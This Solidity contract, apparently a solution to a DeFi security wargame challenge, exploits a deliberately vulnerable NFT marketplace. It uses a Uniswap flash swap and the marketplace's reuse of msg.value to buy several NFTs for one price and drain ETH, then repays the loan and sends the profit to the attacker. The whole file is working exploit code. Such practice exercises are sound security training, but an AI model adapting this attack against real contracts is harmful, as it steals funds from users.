// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IFreeRiderNFTMarketplace  {
    function token() external view returns(IERC721);
    function buyMany(uint256[] calldata tokenIds) external payable;
}


contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    
    using Address for address payable;
    
    IFreeRiderNFTMarketplace immutable nftMarketplace;
    address immutable nftBuyer;
    address immutable attacker;
    
    // 1. store NFT marketplace, buyer and attacker addresses for later use
    constructor(address marketplace, address buyer) {
        nftMarketplace = IFreeRiderNFTMarketplace(marketplace);
        nftBuyer = buyer;
        attacker = msg.sender;
    }
    
    // 2. borrow 'amountWETH' WETH from the Uniswap WETH/DVT 'uniswapPair' using a flash swap and
    //    forward the 'tokenIds' of the NFTs to buy to the callback function
    function attack(address uniswapPair, uint amountWETH, uint256[] calldata tokenIds) external {
        IUniswapV2Pair(uniswapPair).swap(amountWETH, 0, address(this), abi.encode(tokenIds));
    }
    
    // 3. callback function of flash swap
    function uniswapV2Call(address /* sender */, uint amount0 /* amountWETH */, uint /* amount1 */, bytes calldata data /* tokenIds */) external override {
        // 4. get WETH contract and convert borrowed WETH to ETH
        IWETH weth = IWETH(IUniswapV2Pair(msg.sender).token0());
        weth.withdraw(amount0);
        
        // 6. decode NFT IDs from data and buy all of them for the price of one which is possible due to the improper
        //    use of 'msg.value' in the marketplace contract
        uint256[] memory tokenIds = abi.decode(data, (uint256[]));
        nftMarketplace.buyMany{ value: amount0 }(tokenIds);
        // note: the marketplace has another bug which transfers the paid ETH to the owner of the NFT !after! transferring ownership of the NFT
        // --> we end up with 6 NFTs and 6*amount0 ETH (assuming tokenIds.length == 6)
        
        // 8. compute amount to return to Uniswap according to https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps
        //    and convert it to WETH before returning it
        uint amountToReturn = (amount0 * 1000) / 997 + 1; // "+ 1" to make sure to return enough after the integer division
        weth.deposit{ value: amountToReturn }();
        weth.transfer(msg.sender, amountToReturn);
        
        // 9. forward the NFTs to the buyer according to the agreement
        IERC721 nft = nftMarketplace.token();
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), nftBuyer, tokenIds[i]);
        }
        
        // 10. send this contract's remaining ETH to the attacker
        payable(attacker).sendValue(address(this).balance);
    }
    
    // 7. accept any NFT without further checks 
    function onERC721Received(address /* operator */, address /* from */, uint256 /* tokenId */, bytes calldata /* data */) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
    
    // 5. receive ETH (converted from borrowed WETH)
    receive() external payable {}
}
